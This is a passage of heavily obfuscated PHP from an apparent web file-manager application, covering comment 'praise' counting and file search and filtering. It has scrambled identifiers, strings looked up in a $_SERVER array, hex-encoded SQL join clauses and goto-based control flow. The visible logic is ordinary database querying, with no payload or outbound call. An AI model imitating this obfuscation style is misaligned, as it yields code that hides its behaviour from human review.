$ÉÜ£µè = array($ü¨ã¢¨…[498] => $”Ğ¸µĞĞ, $ü¨ã¢¨…[406] => $ûŸ¹¥İ); $Œ†æ×µ£ = $this->where($ÉÜ£µè)->count(); $Øû‘Ñà = array($ü¨ã¢¨…[253] => $Œ†æ×µ£, $ü¨ã¢¨…[1781] => array()); if (!$Œ†æ×µ£) { return $Øû‘Ñà; } $ˆ¡Ÿùê = $this->field($ü¨ã¢¨…[1578])->where($ÉÜ£µè)->limit(500)->select(); $ˆ¡Ÿùê = array_to_keyvalue($ˆ¡Ÿùê, $ü¨ã¢¨…[33], $ü¨ã¢¨…[1578]); $Øû‘Ñà[$ü¨ã¢¨…[1781]] = Model($ü¨ã¢¨…[507])->userListInfo($ˆ¡Ÿùê); return $Øû‘Ñà; } public function prasiseUserList($ƒ¼µ”¹) { $÷¹¾şÀ’ =& $_SERVER[ÏÒ Ì„]; $šóªãå­ = array($÷¹¾şÀ’[1782] => $ƒ¼µ”¹); $îÁ¯“€ = $this->where($šóªãå­)->find(); $·Ğ•Ğ„ = _get($îÁ¯“€, $÷¹¾şÀ’[1777], 0); $£ÈÂ¦»Î = array($÷¹¾şÀ’[253] => $·Ğ•Ğ„, $÷¹¾şÀ’[1781] => array()); if (!$·Ğ•Ğ„) { return $£ÈÂ¦»Î; } $è™Òé™Š = Model($÷¹¾şÀ’[1783])->field($÷¹¾şÀ’[1578])->where($šóªãå­)->limit(500)->select(); $è™Òé™Š = array_to_keyvalue($è™Òé™Š, $÷¹¾şÀ’[33], $÷¹¾şÀ’[1578]); $£ÈÂ¦»Î[$÷¹¾şÀ’[1781]] = Model($÷¹¾şÀ’[507])->userListInfo($è™Òé™Š); return $£ÈÂ¦»Î; } public function remove($²´‰ôë) { $Àêë×ª =& $_SERVER[ÏÒ Ì„]; $À •ÒÏÈ = array($Àêë×ª[1775] => $²´‰ôë); $ŸŠÎ¹²Š = $this->where($À •ÒÏÈ)->find(); if ($ŸŠÎ¹²Š[$Àêë×ª[1774]]) { $this->where(array($Àêë×ª[1775] => $ŸŠÎ¹²Š[$Àêë×ª[1774]]))->setAdd($Àêë×ª[1776], -1); } return $this->where($À •ÒÏÈ)->delete(); } public function edit($‘¼Åë¦¾, $˜ÔÈÜòÕ) { $òİ¹¹ÏÓ =& $_SERVER[ÏÒ Ì„]; $åŞ•ä­í = array($òİ¹¹ÏÓ[1775] => $‘¼Åë¦¾); return $this->where($åŞ•ä­í)->save(array($òİ¹¹ÏÓ[1784] => $˜ÔÈÜòÕ)); } public function prasise($øÎ ‹ö±) { $ô¨Á¼ÉÎ =& $_SERVER[ÏÒ Ì„]; $àÖ€Ş¿Ğ = Model($ô¨Á¼ÉÎ[1785]); $Ÿ·ØƒØ§ = array($ô¨Á¼ÉÎ[1775] => $øÎ ‹ö±, $ô¨Á¼ÉÎ[1569] => USER_ID); $”åØ‰êù = $àÖ€Ş¿Ğ->where($Ÿ·ØƒØ§)->find(); if (!$”åØ‰êù) { $àÖ€Ş¿Ğ->add($Ÿ·ØƒØ§); $ñ´³òğ = $this->where(array($ô¨Á¼ÉÎ[1775] => $øÎ ‹ö±))->setAdd($ô¨Á¼ÉÎ[1777], 1); } else { $àÖ€Ş¿Ğ->where($Ÿ·ØƒØ§)->delete(); $ñ´³òğ = $this->where(array($ô¨Á¼ÉÎ[1775] => $øÎ ‹ö±))->setAdd($ô¨Á¼ÉÎ[1777], -1); } return $ñ´³òğ; } public function targetInfo($ëçİ’·¬, $æåÕŒšé) { $ã’÷Ï– =& $_SERVER[ÏÒ Ì„]; $Ûá¢®Ã = array($ã’÷Ï–[574] => $ëçİ’·¬, $ã’÷Ï–[575] => $æåÕŒšé); $Õ×ìÅ†Í = $this->where($Ûá¢®Ã)->count(); $ªùÇ€»Í = "\x52\111\107\110\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\143\x6f\155\x6d\145\x6e\164\x5f\x70\x72\x61\x69\163\x65\40\x73\x74\x61\x72\x20\157\156\40\143\157\x6d\155\145\156\x74\x2e\x63\x6f\x6d\155\145\156\164\111\104\x20\x3d\x20\x73\164\141\x72\x2e\x63\157\155\155\x65\x6e\164\111\x44"; $¥ÔÏõ¿¬ = $this->alias($ã’÷Ï–[352])->where($Ûá¢®Ã)->join($ªùÇ€»Í, $ã’÷Ï–[1786])->count(); $ğÛ¶òÂ€ = array($ã’÷Ï–[1787] => $Õ×ìÅ†Í, $ã’÷Ï–[1788] => $¥ÔÏõ¿¬); return $ğÛ¶òÂ€; } public function listData($§Š“Ğ†ê) { $ŸĞ­ä™­ =& $_SERVER[ÏÒ Ì„]; if (isset($§Š“Ğ†ê[$ŸĞ­ä™­[1789]])) { if ($§Š“Ğ†ê[$ŸĞ­ä™­[1789]]) { $§Š“Ğ†ê[$ŸĞ­ä™­[1782]] = array($ŸĞ­ä™­[1008], intval($§Š“Ğ†ê[$ŸĞ­ä™­[1789]])); } unset($§Š“Ğ†ê[$ŸĞ­ä™­[1789]]); } if (isset($§Š“Ğ†ê[$ŸĞ­ä™­[1790]])) { if ($§Š“Ğ†ê[$ŸĞ­ä™­[1790]]) { $§Š“Ğ†ê[$ŸĞ­ä™­[1782]] = array($ŸĞ­ä™­[1005], intval($§Š“Ğ†ê[$ŸĞ­ä™­[1790]])); } unset($§Š“Ğ†ê[$ŸĞ­ä™­[1790]]); } return $this->_listData($§Š“Ğ†ê); } private function _listData($Ñ­š­) { $ÔãÒ‘éÏ =& $_SERVER[ÏÒ Ì„]; $ äÆ…­Ÿ = $this->where($Ñ­š­)->_makeOrder()->selectPage(100); $this->_listAppendParent($ äÆ…­Ÿ[$ÔãÒ‘éÏ[367]]); $this->_listAppendUser($ äÆ…­Ÿ[$ÔãÒ‘éÏ[367]]); $this->_listAppendMeta($ äÆ…­Ÿ[$ÔãÒ‘éÏ[367]]); return $ äÆ…­Ÿ; } private function _makeOrder() { $†¦à¯è¿ =& $_SERVER[ÏÒ Ì„]; $éøŠ½Ÿ = array($†¦à¯è¿[1777], $†¦à¯è¿[1776], $†¦à¯è¿[194]); $£¨Ô¨æñ = Input::get($†¦à¯è¿[449], $†¦à¯è¿[7], $†¦à¯è¿[418], $éøŠ½Ÿ); $¹ï«Èğ‘ = Input::get($†¦à¯è¿[450], $†¦à¯è¿[7], $†¦à¯è¿[1571], array($†¦à¯è¿[1791], $†¦à¯è¿[445])); $óµô÷“ù = $£¨Ô¨æñ . $†¦à¯è¿[50] . $¹ï«Èğ‘; return $this->order($óµô÷“ù); } private function _listAppendParent(&$ì¨Â—) { $ÁË¿°äÂ =& $_SERVER[ÏÒ Ì„]; $Í›ì¥¼ = array_unique(array_to_keyvalue($ì¨Â—, $ÁË¿°äÂ[33], $ÁË¿°äÂ[1774])); $Í›ì¥¼ = array_remove_value($Í›ì¥¼, $ÁË¿°äÂ[191]); if (!$Í›ì¥¼) { return; } $¥Ø•ÙÓÔ = $this->where(array($ÁË¿°äÂ[1775] => array($ÁË¿°äÂ[7], $Í›ì¥¼)))->select(); $¥Ø•ÙÓÔ = array_to_keyvalue($¥Ø•ÙÓÔ, $ÁË¿°äÂ[1782]); foreach ($ì¨Â— as &$ğ¼¢Ÿáº) { if (isset($¥Ø•ÙÓÔ[$ğ¼¢Ÿáº[$ÁË¿°äÂ[1774]]])) { $ğ¼¢Ÿáº[$ÁË¿°äÂ[1792]] = $¥Ø•ÙÓÔ[$ğ¼¢Ÿáº[$ÁË¿°äÂ[1774]]]; } } unset($ğ¼¢Ÿáº); } private function _listAppendUser(&$Šäú—©) { $¢»ØîÌ° =& $_SERVER[ÏÒ Ì„]; $÷¶·å¶ = array_unique(array_to_keyvalue($Šäú—©, $¢»ØîÌ°[33], $¢»ØîÌ°[1578])); $÷¶·å¶ = array_remove_value($÷¶·å¶, $¢»ØîÌ°[191]); if (count($÷¶·å¶) == 0) { return; } foreach ($Šäú—© as $ÔÖŞ¾õ’) { if (isset($ÔÖŞ¾õ’[$¢»ØîÌ°[1792]])) { $÷¶·å¶[] = $ÔÖŞ¾õ’[$¢»ØîÌ°[1792]][$¢»ØîÌ°[1578]]; } } $Ğ¤Åå = Model($¢»ØîÌ°[532])->userListInfo($÷¶·å¶); foreach ($Šäú—© as &$ÔÖŞ¾õ’) { $ÔÖŞ¾õ’[$¢»ØîÌ°[588]] = $Ğ¤Åå[$ÔÖŞ¾õ’[$¢»ØîÌ°[1578]]]; if (isset($ÔÖŞ¾õ’[$¢»ØîÌ°[1792]])) { $ÔÖŞ¾õ’[$¢»ØîÌ°[1792]][$¢»ØîÌ°[588]] = $Ğ¤Åå[$ÔÖŞ¾õ’[$¢»ØîÌ°[1792]][$¢»ØîÌ°[1578]]]; } } unset($ÔÖŞ¾õ’); } private function _listAppendMeta(&$Â Íù¼À) { $Øî×‰’Ÿ =& $_SERVER[ÏÒ Ì„]; $ªßá¡£ = array_unique(array_to_keyvalue($Â Íù¼À, $Øî×‰’Ÿ[33], $Øî×‰’Ÿ[1782])); $ªßá¡£ = array_remove_value($ªßá¡£, $Øî×‰’Ÿ[191]); if (!$ªßá¡£) { return; } foreach ($Â Íù¼À as $•º’¼–à) { if (isset($•º’¼–à[$Øî×‰’Ÿ[1792]])) { $ªßá¡£[] = $•º’¼–à[$Øî×‰’Ÿ[1792]][$Øî×‰’Ÿ[1782]]; } } $»ç…Ûş˜ = $this->metaList($ªßá¡£); if (!$»ç…Ûş˜) { return !1; } foreach ($Â Íù¼À as &$•º’¼–à) { $•º’¼–à[$Øî×‰’Ÿ[459]] = $»ç…Ûş˜[$•º’¼–à[$Øî×‰’Ÿ[1782]]]; if (isset($•º’¼–à[$Øî×‰’Ÿ[1792]])) { $•º’¼–à[$Øî×‰’Ÿ[1792]][$Øî×‰’Ÿ[459]] = $»ç…Ûş˜[$•º’¼–à[$Øî×‰’Ÿ[1792]][$Øî×‰’Ÿ[1782]]]; } } unset($•º’¼–à); } private function metaList($ŒñÃØïŒ) { $öâ¥äŒ =& $_SERVER[ÏÒ Ì„]; if (!$ŒñÃØïŒ) { return array(); } $Á¿•·³œ = array($öâ¥äŒ[1782] => array($öâ¥äŒ[7], $ŒñÃØïŒ)); $íÓƒê§Ç = Model($öâ¥äŒ[1793])->where($Á¿•·³œ)->select(); $íÓƒê§Ç = array_to_keyvalue_group($íÓƒê§Ç, $öâ¥äŒ[1782]); foreach ($íÓƒê§Ç as $Ö¨­ëİã => $½‚ƒõÙ) { $éÊÙ¡§÷ = array(); foreach ($½‚ƒõÙ as $¥ÎÅç©±) { $éÊÙ¡§÷[$¥ÎÅç©±[$öâ¥äŒ[93]]] = $¥ÎÅç©±[$öâ¥äŒ[372]]; } $íÓƒê§Ç[$Ö¨­ëİã] = $éÊÙ¡§÷; } return $íÓƒê§Ç ? $íÓƒê§Ç : array(); } } goto c²÷öÕÇ¶Ğ; dØ¯ğà¡¤é: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÜËşü«) { $¼éòóÉ =& $_SERVER[ÏÒ Ì„]; $µ­÷Ê = KodIO::fileTypeList(); $Ìà¿¥ª© = $µ­÷Ê[$ÜËşü«]; if (!$Ìà¿¥ª©) { return array(); } $¤ã´…Ø = $Ìà¿¥ª©[$¼éòóÉ[168]]; $äš¸¯…Æ = $¼éòóÉ[7]; if (!$Ìà¿¥ª©[$¼éòóÉ[168]]) { $ÚíÑˆµ = array_to_keyvalue($µ­÷Ê, $¼éòóÉ[33], $¼éòóÉ[168]); $¤ã´…Ø = implode($¼éòóÉ[47], $ÚíÑˆµ); $äš¸¯…Æ = $¼éòóÉ[1992]; } $×–÷Æ§¯ = explode($¼éòóÉ[47], trim($¤ã´…Ø, $¼éòóÉ[47])); return array($äš¸¯…Æ, $×–÷Æ§¯); } public function listPathType($€õ¯©ªä) { $‰Ãñì‘¥ =& $_SERVER[ÏÒ Ì„]; $äÉ˜ÛË² = $this->fileTypeWhere($€õ¯©ªä); if (!$äÉ˜ÛË²) { return array(); } $òÎâ˜òµ = array($‰Ãñì‘¥[574] => SourceModel::TYPE_USER, $‰Ãñì‘¥[575] => USER_ID, $‰Ãñì‘¥[571] => 0, $‰Ãñì‘¥[572] => $äÉ˜ÛË²); return $this->listSource($òÎâ˜òµ); } public function listSearch($åÀİ—å·, $ïêº‹ = 300) { $¬í§€½¾ =& $_SERVER[ÏÒ Ì„]; if (isset($åÀİ—å·[$¬í§€½¾[1837]]) && $åÀİ—å·[$¬í§€½¾[1837]]) { $åÀİ—å·[$¬í§€½¾[1837]] = str_replace($¬í§€½¾[382], $¬í§€½¾[1993], trim($åÀİ—å·[$¬í§€½¾[1837]])); } $¦ì§åÁŸ = $this->_parseSearchWhere($åÀİ—å·); $£‡¨¥ = $¦ì§åÁŸ; if (!isset($¦ì§åÁŸ[$¬í§€½¾[425]])) { $¦ì§åÁŸ[$¬í§€½¾[425]] = 0; } $ŠÛûØè¢ = $¬í§€½¾[1994]; $—’÷ÌÖí = $ŠÛûØè¢; $this->_listSearchBindPinyin($åÀİ—å·, $¦ì§åÁŸ, $ŠÛûØè¢); $this->alias($¬í§€½¾[438])->_makeOrder(); $¦ì§åÁŸ = $this->parseWhereLike($¦ì§åÁŸ); $ú¤ùô÷— = $this->distinct(!0)->field($ŠÛûØè¢)->where($¦ì§åÁŸ)->selectPage($ïêº‹); $this->_listSearchFileContent($ú¤ùô÷—, $åÀİ—å·, $—’÷ÌÖí, $£‡¨¥); $this->_listSearchDesc($ú¤ùô÷—, $åÀİ—å·, $—’÷ÌÖí); $this->_listSearchTag($ú¤ùô÷—, $åÀİ—å·, $—’÷ÌÖí); $this->_listSearchGroupTag($ú¤ùô÷—, $åÀİ—å·, $—’÷ÌÖí); $this->_listDataApply($ú¤ùô÷—[$¬í§€½¾[367]]); $this->_listMake($ú¤ùô÷—); return $ú¤ùô÷—; } private function _listSearchFileContent(&$«Æ¯íê, $¼ıÌû×, $ó¡ŞÎ×Æ, $¸ù€Ò’¤) { $ÚÎ´ñšó =& $_SERVER[ÏÒ Ì„]; if (!$¼ıÌû×[$ÚÎ´ñšó[1837]] || $«Æ¯íê[$ÚÎ´ñšó[364]][$ÚÎ´ñšó[351]] > 1) { return; } if (!isset($¸ù€Ò’¤[$ÚÎ´ñšó[28]]) || !is_array($¼ıÌû×[$ÚÎ´ñšó[461]])) { return; } $¸ù€Ò’¤[$ÚÎ´ñšó[461]] = array($ÚÎ´ñšó[7], $¼ıÌû×[$ÚÎ´ñšó[461]]); unset($¸ù€Ò’¤[$ÚÎ´ñšó[28]]); unset($¼ıÌû×[$ÚÎ´ñšó[461]]); $ÑØÔÃ’ö = $this->field($ó¡ŞÎ×Æ)->where($¸ù€Ò’¤)->limit($ÚÎ´ñšó[1995])->select(); if (!$ÑØÔÃ’ö || count($ÑØÔÃ’ö) == 0) { return; } $«Æ¯íê[$ÚÎ´ñšó[367]] = array_merge($ÑØÔÃ’ö, $«Æ¯íê[$ÚÎ´ñšó[367]]); $«Æ¯íê[$ÚÎ´ñšó[364]][$ÚÎ´ñšó[365]] += count($ÑØÔÃ’ö); } private function _listSearchTag(&$§¯ø„Í, $ò«Ø­œş, $ØÈöÌŠÈ) { $¼şÅáÌ‡ =& $_SERVER[ÏÒ Ì„]; if (!$ò«Ø­œş[$¼şÅáÌ‡[1837]] || $§¯ø„Í[$¼şÅáÌ‡[364]][$¼şÅáÌ‡[351]] > 1) { return; } $ó˜¸Á°î = Model($¼şÅáÌ‡[1996])->listData(); $ã­°¦üä = array(); $ÉÖâï£ = $ò«Ø­œş[$¼şÅáÌ‡[1837]]; foreach ($ó˜¸Á°î as $‹Ã–Ì½) { $ÚòãÖ‚¤ = $‹Ã–Ì½[$¼şÅáÌ‡[28]]; $ØôÂµÓ = str_replace($¼şÅáÌ‡[50], $¼şÅáÌ‡[33], Pinyin::get($ÚòãÖ‚¤)); if (stripos($ÚòãÖ‚¤, $ÉÖâï£) !== !1 || stripos($ØôÂµÓ, $ÉÖâï£) !== !1) { $ã­°¦üä[] = $‹Ã–Ì½[$¼şÅáÌ‡[395]]; } } if (!$ã­°¦üä) { return; } $Òº•€° = array($¼şÅáÌ‡[421] => array($¼şÅáÌ‡[7], $ã­°¦üä), $¼şÅáÌ‡[1578] => USER_ID); $øÁÕ†ºå = Model($¼şÅáÌ‡[422])->field($¼şÅáÌ‡[76])->where($Òº•€°)->select(); $øÁÕ†ºå = array_to_keyvalue($øÁÕ†ºå, $¼şÅáÌ‡[33], $¼şÅáÌ‡[76]); $¹Ü¾©øş = array_unique($øÁÕ†ºå); $this->_listSearchMerge($§¯ø„Í, $ò«Ø­œş, $ØÈöÌŠÈ, $¹Ü¾©øş); } private function _listSearchDesc(&$Åú¤Ö, $ü‘­İÍ¾, $¦£ñ˜œ¡) { $í˜Çíú» =& $_SERVER[ÏÒ Ì„]; if (!$ü‘­İÍ¾[$í˜Çíú»[1837]] || $Åú¤Ö[$í˜Çíú»[364]][$í˜Çíú»[351]] > 1) { return; } $µ¦Å¨–ğ = $this->listSearchChildren($ü‘­İÍ¾[$í˜Çíú»[492]]); $µ¦Å¨–ğ = array_unique($µ¦Å¨–ğ); if (!$µ¦Å¨–ğ) { return; } $˜€ò«É½ = array($í˜Çíú»[397] => array($í˜Çíú»[7], $µ¦Å¨–ğ), $í˜Çíú»[93] => $í˜Çíú»[445], $í˜Çíú»[372] => array($í˜Çíú»[381], $í˜Çíú»[1839] . $ü‘­İÍ¾[$í˜Çíú»[1837]] . $í˜Çíú»[1839])); $‹‰°ø·© = Model($í˜Çíú»[557])->field($í˜Çíú»[397])->where($˜€ò«É½)->select(); $ßö’¯İá = array_to_keyvalue($‹‰°ø·©, $í˜Çíú»[33], $í˜Çíú»[397]); $this->_listSearchMerge($Åú¤Ö, $ü‘­İÍ¾, $¦£ñ˜œ¡, $ßö’¯İá); } private function _listSearchGroupTag(&$¤´•…÷, $‰ëå‘ğ, $ÏşÀ—Œô) { $ŒØÕñÔÅ =& $_SERVER[ÏÒ Ì„]; if (!$‰ëå‘ğ[$ŒØÕñÔÅ[1837]] || $¤´•…÷[$ŒØÕñÔÅ[364]][$ŒØÕñÔÅ[351]] > 1 || !$‰ëå‘ğ[$ŒØÕñÔÅ[492]]) { return; } $ƒ›ÑœŒ = $this->sourceInfo($‰ëå‘ğ[$ŒØÕñÔÅ[492]]); if (!$ƒ›ÑœŒ || $ƒ›ÑœŒ[$ŒØÕñÔÅ[406]] != SourceModel::TYPE_GROUP) { return; } $“Îı„ÅÆ = $ƒ›ÑœŒ[$ŒØÕñÔÅ[498]]; $‹‚Üîø = Model($ŒØÕñÔÅ[1997])->get($“Îı„ÅÆ); $àÚúğğè = array(); $‰öÈÉŒ = $‰ëå‘ğ[$ŒØÕñÔÅ[1837]]; foreach ($‹‚Üîø[$ŒØÕñÔÅ[367]] as $ñĞñâ•) { $ÌØíá€Õ = $ñĞñâ•[$ŒØÕñÔÅ[28]]; $µÚû¹­Á = str_replace($ŒØÕñÔÅ[50], $ŒØÕñÔÅ[33], Pinyin::get($ÌØíá€Õ)); if (stripos($ÌØíá€Õ, $‰öÈÉŒ) !== !1 || stripos($µÚû¹­Á, $‰öÈÉŒ) !== !1) { $àÚúğğè[] = $ñĞñâ•[$ŒØÕñÔÅ[395]]; } } if (!$àÚúğğè) { return; } $–Ôõş¶ = array($ŒØÕñÔÅ[421] => array($ŒØÕñÔÅ[7], $àÚúğğè), $ŒØÕñÔÅ[1578] => 0, $ŒØÕñÔÅ[29] => $ŒØÕñÔÅ[1861] . $“Îı„ÅÆ); $éëİ¨ÂÜ = Model($ŒØÕñÔÅ[422])->field($ŒØÕñÔÅ[76])->where($–Ôõş¶)->select(); $éëİ¨ÂÜ = array_to_keyvalue($éëİ¨ÂÜ, $ŒØÕñÔÅ[33], $ŒØÕñÔÅ[76]); $‡¦•ÊŸ = array_unique($éëİ¨ÂÜ); $this->_listSearchMerge($¤´•…÷, $‰ëå‘ğ, $ÏşÀ—Œô, $‡¦•ÊŸ); } private function _listSearchMerge(&$¶Úêæ³´, $±„Ú­š, $°“¬·ªÉ, $ÃâÓòÓ) { $ùîÜªÓ³ =& $_SERVER[ÏÒ Ì„]; if (!$ÃâÓòÓ) { return; } $¯ÇÉö‡é = array_to_keyvalue($¶Úêæ³´[$ùîÜªÓ³[367]], $ùîÜªÓ³[33], $ùîÜªÓ³[397]); $ÌÕ£Ñó„ = array_diff($ÃâÓòÓ, $¯ÇÉö‡é); if (!$ÌÕ£Ñó„) { return; } $è˜Ê†ëï = array($ùîÜªÓ³[397] => array($ùîÜªÓ³[7], $ÌÕ£Ñó„)); $Ş²˜’Ë» = $this->field($°“¬·ªÉ)->where($è˜Ê†ëï)->select(); if (!$Ş²˜’Ë») { return; } $ì´ƒ©ğ‰ = array(); foreach ($Ş²˜’Ë» as $Óå…Ü˜) { if ($this->_listSearchFilter($Óå…Ü˜, $±„Ú­š)) { $ì´ƒ©ğ‰[] = $Óå…Ü˜; } } $¶Úêæ³´[$ùîÜªÓ³[367]] = array_merge($ì´ƒ©ğ‰, $¶Úêæ³´[$ùîÜªÓ³[367]]); $¶Úêæ³´[$ùîÜªÓ³[364]][$ùîÜªÓ³[365]] += count($ì´ƒ©ğ‰); } private function _listSearchFilter($ä—ì£Ü“, $Ó­òğè) { $”ÊŒÉŠä =& $_SERVER[ÏÒ Ì„]; $ı…¨›øş = $ä—ì£Ü“[$”ÊŒÉŠä[405]] == $”ÊŒÉŠä[87]; if (!strstr($ä—ì£Ü“[$”ÊŒÉŠä[515]], $”ÊŒÉŠä[47] . $Ó­òğè[$”ÊŒÉŠä[492]] . $”ÊŒÉŠä[47])) { return !1; } if (isset($Ó­òğè[$”ÊŒÉŠä[407]]) && $Ó­òğè[$”ÊŒÉŠä[407]] != $”ÊŒÉŠä[1800]) { if ($Ó­òğè[$”ÊŒÉŠä[407]] == $”ÊŒÉŠä[77] && !$ı…¨›øş) { return !1; } if ($Ó­òğè[$”ÊŒÉŠä[407]] != $”ÊŒÉŠä[77] && $ı…¨›øş) { return !1; } if (!strstr($ä—ì£Ü“[$”ÊŒÉŠä[168]], $”ÊŒÉŠä[47] . $Ó­òğè[$”ÊŒÉŠä[407]] . $”ÊŒÉŠä[47])) { return !1; } } if (isset($Ó­òğè[$”ÊŒÉŠä[1998]]) && $Ó­òğè[$”ÊŒÉŠä[1998]] < $ä—ì£Ü“[$”ÊŒÉŠä[78]]) { return !1; } if (isset($Ó­òğè[$”ÊŒÉŠä[1999]]) && $Ó­òğè[$”ÊŒÉŠä[1999]] > $ä—ì£Ü“[$”ÊŒÉŠä[78]]) { return !1; } if (isset($Ó­òğè[$”ÊŒÉŠä[588]]) && $Ó­òğè[$”ÊŒÉŠä[588]] != $ä—ì£Ü“[$”ÊŒÉŠä[448]]) { return !1; } return !0; } public function listSearchChildren($×Ì•êèú, $È·¦‰‹³ = 5000) { $ÔÜı¬œÖ =& $_SERVER[ÏÒ Ì„]; $ö±†Ê–¿ = array(); $äÖÖ±äî = $this->sourceInfo($×Ì•êèú); $¢½¥ÔĞš = array($ÔÜı¬œÖ[515] => array($ÔÜı¬œÖ[381], $äÖÖ±äî[$ÔÜı¬œÖ[515]] . $äÖÖ±äî[$ÔÜı¬œÖ[397]] . $ÔÜı¬œÖ[539])); $„äÃÕ« = $this->field($ÔÜı¬œÖ[397])->cache(null, 600)->where($¢½¥ÔĞš)->count(); if ($„äÃÕ« > $È·¦‰‹³) { return $this->_listSearchChildrenNear($×Ì•êèú, $È·¦‰‹³); } $‹˜–«Óñ = $this->field($ÔÜı¬œÖ[397])->where($¢½¥ÔĞš)->select(); $ö±†Ê–¿ = array_to_keyvalue($‹˜–«Óñ, $ÔÜı¬œÖ[33], $ÔÜı¬œÖ[397]); return $ö±†Ê–¿; } private function _listSearchChildrenNear($Ò˜¶¡§ë, $µØ¼‚¸²) { $Ì¶áÁÁç =& $_SERVER[ÏÒ Ì„]; $éü¸ÙıÁ = array(); $¡á Ñê‹ = array($Ì¶áÁÁç[492] => $Ò˜¶¡§ë); $³©…è¿ó = $this->field($Ì¶áÁÁç[2000])->where($¡á Ñê‹)->select(); $¦¬Š¦ = array_to_keyvalue(array_filter_by_field($³©…è¿ó, $Ì¶áÁÁç[405], $Ì¶áÁÁç[87]), $Ì¶áÁÁç[33], $Ì¶áÁÁç[397]); $éü¸ÙıÁ = array_merge($éü¸ÙıÁ, array_to_keyvalue($³©…è¿ó, $Ì¶áÁÁç[33], $Ì¶áÁÁç[397])); if (!$¦¬Š¦) { return $éü¸ÙıÁ; } $¡á Ñê‹ = array($Ì¶áÁÁç[492] => array($Ì¶áÁÁç[7], $¦¬Š¦)); $³©…è¿ó = $this->field($Ì¶áÁÁç[2000])->where($¡á Ñê‹)->limit($µØ¼‚¸²)->select(); $éü¸ÙıÁ = array_merge($éü¸ÙıÁ, array_to_keyvalue($³©…è¿ó, $Ì¶áÁÁç[33], $Ì¶áÁÁç[397])); $éü¸ÙıÁ = array_slice($éü¸ÙıÁ, 0, $µØ¼‚¸²); return $éü¸ÙıÁ; } private function _listSearchBindPinyin($¥âÃÛ¬ˆ, &$§ŠëÖ”è, &$‰Ä¯Ÿ­Ì) { $êó²¨×½ =& $_SERVER[ÏÒ Ì„]; if (!isset($¥âÃÛ¬ˆ[$êó²¨×½[1837]]) || !$¥âÃÛ¬ˆ[$êó²¨×½[1837]]) { return; } if (!Input::check($¥âÃÛ¬ˆ[$êó²¨×½[1837]], $êó²¨×½[316]) || strlen($¥âÃÛ¬ˆ[$êó²¨×½[1837]]) < 2) { return; } $îÅÙöÇ = "\x4c\105\106\x54\x20\112\117\111\x4e\40{$this->tablePrefix}\x69\157\x5f\x73\x6f\x75\x72\143\x65\137\x6d\145\164\x61\40\155\145\164\x61\40\157\x6e\x20\x73\x6f\165\x72\x63\145\56\163\157\x75\x72\x63\x65\111\104\40\x3d\x20\155\x65\164\x61\56\x73\x6f\x75\x72\x63\x65\111\104"; $‡™™ñ˜ô = array(); $‰Ä¯Ÿ­Ì = str_replace(array($êó²¨×½[229], $êó²¨×½[50], $êó²¨×½[2001]), $êó²¨×½[33], $‰Ä¯Ÿ­Ì); $‰Ä¯Ÿ­Ì = $êó²¨×½[430] . str_replace($êó²¨×½[47], $êó²¨×½[431], $‰Ä¯Ÿ­Ì); $‡’Åüº = $§ŠëÖ”è[$êó²¨×½[28]]; unset($§ŠëÖ”è[$êó²¨×½[28]]); foreach ($§ŠëÖ”è as $Ê¿ëäøÕ => $¶ºïÈ—É) { $‡™™ñ˜ô[$êó²¨×½[430] . $Ê¿ëäøÕ] = $¶ºïÈ—É; } foreach ($‡’Åüº as $î¨³×üÓ) { $‡™™ñ˜ô[] = array($êó²¨×½[435] => $î¨³×üÓ, $êó²¨×½[994] => $êó²¨×½[1841], array($êó²¨×½[2002] => $î¨³×üÓ, $êó²¨×½[2003] => array($êó²¨×½[7], array($êó²¨×½[458], $êó²¨×½[457])))); } $this->join($îÅÙöÇ); $§ŠëÖ”è = $‡™™ñ˜ô; } private function _parseSearchWhere($‘•İÛ¸) { $ø»€¨İ¢ =& $_SERVER[ÏÒ Ì„]; $Ä®¯£ôá = array(); if (isset($‘•İÛ¸[$ø»€¨İ¢[751]]) && $‘•İÛ¸[$ø»€¨İ¢[751]]) { $Ä®¯£ôá[$ø»€¨İ¢[84]] = array($ø»€¨İ¢[2004], $‘•İÛ¸[$ø»€¨İ¢[751]]); } if (isset($‘•İÛ¸[$ø»€¨İ¢[490]]) && $‘•İÛ¸[$ø»€¨İ¢[490]]) { $ÈÙè€€ = array($ø»€¨İ¢[2005], $‘•İÛ¸[$ø»€¨İ¢[490]]); if ($Ä®¯£ôá[$ø»€¨İ¢[84]]) { $Ä®¯£ôá[$ø»€¨İ¢[84]] = array($Ä®¯£ôá[$ø»€¨İ¢[84]], $ÈÙè€€, $ø»€¨İ¢[2006]); } else { $Ä®¯£ôá[$ø»€¨İ¢[84]] = $ÈÙè€€; } } if (isset($‘•İÛ¸[$ø»€¨İ¢[1998]]) && $‘•İÛ¸[$ø»€¨İ¢[1998]] > 0) { $Ä®¯£ôá[$ø»€¨İ¢[78]] = array($ø»€¨İ¢[2004], $‘•İÛ¸[$ø»€¨İ¢[1998]]); } if (isset($‘•İÛ¸[$ø»€¨İ¢[1999]]) && $‘•İÛ¸[$ø»€¨İ¢[1999]]) { $ÈÙè€€ = array($ø»€¨İ¢[2005], $‘•İÛ¸[$ø»€¨İ¢[1999]]); if ($Ä®¯£ôá[$ø»€¨İ¢[78]]) { $Ä®¯£ôá[$ø»€¨İ¢[78]] = array($Ä®¯£ôá[$ø»€¨İ¢[78]], $ÈÙè€€, $ø»€¨İ¢[2006]); } else { $Ä®¯£ôá[$ø»€¨İ¢[78]] = $ÈÙè€€; } } if (isset($‘•İÛ¸[$ø»€¨İ¢[588]]) && $‘•İÛ¸[$ø»€¨İ¢[588]]) { $Ä®¯£ôá[] = array($ø»€¨İ¢[448] => $‘•İÛ¸[$ø»€¨İ¢[588]], $ø»€¨İ¢[446] => $‘•İÛ¸[$ø»€¨İ¢[588]], $ø»€¨İ¢[994] => $ø»€¨İ¢[1841]); } if (isset($‘•İÛ¸[$ø»€¨İ¢[407]]) && $‘•İÛ¸[$ø»€¨İ¢[407]]) { $­´ç³¢Ş = $‘•İÛ¸[$ø»€¨İ¢[407]]; if ($­´ç³¢Ş == $ø»€¨İ¢[77]) { $Ä®¯£ôá[$ø»€¨İ¢[405]] = 1; } else { if ($­´ç³¢Ş == $ø»€¨İ¢[2007]) { $Ä®¯£ôá[$ø»€¨İ¢[405]] = 0; } else { if ($­´ç³¢Ş) { $­´ç³¢Ş = is_array($­´ç³¢Ş) ? $­´ç³¢Ş : explode($ø»€¨İ¢[47], $­´ç³¢Ş); 